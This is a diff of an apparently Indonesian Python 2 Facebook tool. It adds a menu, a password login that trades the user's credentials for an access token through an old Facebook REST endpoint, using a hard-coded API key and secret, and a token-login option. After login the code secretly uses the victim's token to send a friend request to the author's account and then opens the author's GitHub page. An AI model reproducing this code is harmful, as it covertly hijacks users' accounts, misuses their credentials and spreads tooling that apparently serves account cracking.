@@ -90,64 +90,107 @@ vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 
 
+##### Pilih Login #####
+def masuk():
+	os.system('reset')
+	print logo
+	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login"
+	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
+	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
+	print "\033[1;95m║"
+	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
+	if msuk =="":
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+	elif msuk =="1":
+		login()
+	elif msuk =="2":
+		tokenz()
+	elif msuk =="0":
+		keluar()
+	else:
+		print"\033[1;91m[!] Wrong input"
+		keluar()
+		
+#### LOGIN #####
 def login():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r')
-        menu()
-    except (KeyError, IOError):
-        os.system('clear')
-        print logo
-        print 54 * '\x1b[1;97m\xe2\x95\x90'
-        print '\n \x1b[1;91m[\xe2\x98\x86] \x1b[1;92mMASUK AKUN FACEBOOK \x1b[1;91m[\xe2\x98\x86]'
-        id = raw_input('\n \x1b[1;91m[+] \x1b[1;36mEmail \x1b[1;91m:\x1b[1;92m ')
-        pwd = getpass.getpass('\n \x1b[1;91m[+] \x1b[1;36mSandi \x1b[1;91m:\x1b[1;92m ')
-        tik()
-        try:
-            br.open('https://m.facebook.com')
-        except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
-            keluar()
-
-        br._factory.is_html = True
-        br.select_form(nr=0)
-        br.form['email'] = id
-        br.form['pass'] = pwd
-        br.submit()
-        url = br.geturl()
-        if 'save-device' in url:
-            try:
-                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
-                x = hashlib.new('md5')
-                x.update(sig)
-                a = x.hexdigest()
-                data.update({'sig': a})
-                url = 'https://api.facebook.com/restserver.php'
-                r = requests.get(url, params=data)
-                z = json.loads(r.text)
-                zedd = open('login.txt', 'w')
-                zedd.write(z['access_token'])
-                zedd.close()
-                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
-                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/channel/UCz5Z718-ZRUy9aBzCAHqrug')
-                time.sleep(1)
-                menu()
-            except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak Ada Koneksi'
-                keluar()
-
-        if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Has Been Checkpoint'
-            os.system('rm -rf login.txt')
-            time.sleep(1)
-            keluar()
-        else:
-            print '\n\x1b[1;91m[!] Gagal Masuk'
-            os.system('rm -rf login.txt')
-            time.sleep(1)
-            login()
+	os.system('reset')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('reset')
+		print logo
+		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
+		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
+		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\033[1;91m[!] No connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				zedd = open("login.txt", 'w')
+				zedd.write(z['access_token'])
+				zedd.close()
+				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				os.system('xdg-open https://github.com/CrazyLolz100')
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\033[1;91m[!] No connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\033[1;91m[!] \033[1;93mAccount Checkpoint")
+			print("\n\033[1;92m[#] Harap Login Ulang !")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\033[1;91m[!] Login Failed")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+			
+##### TOKEN #####
+def tokenz():
+	os.system('reset')
+	print logo
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
 
 
 def menu():
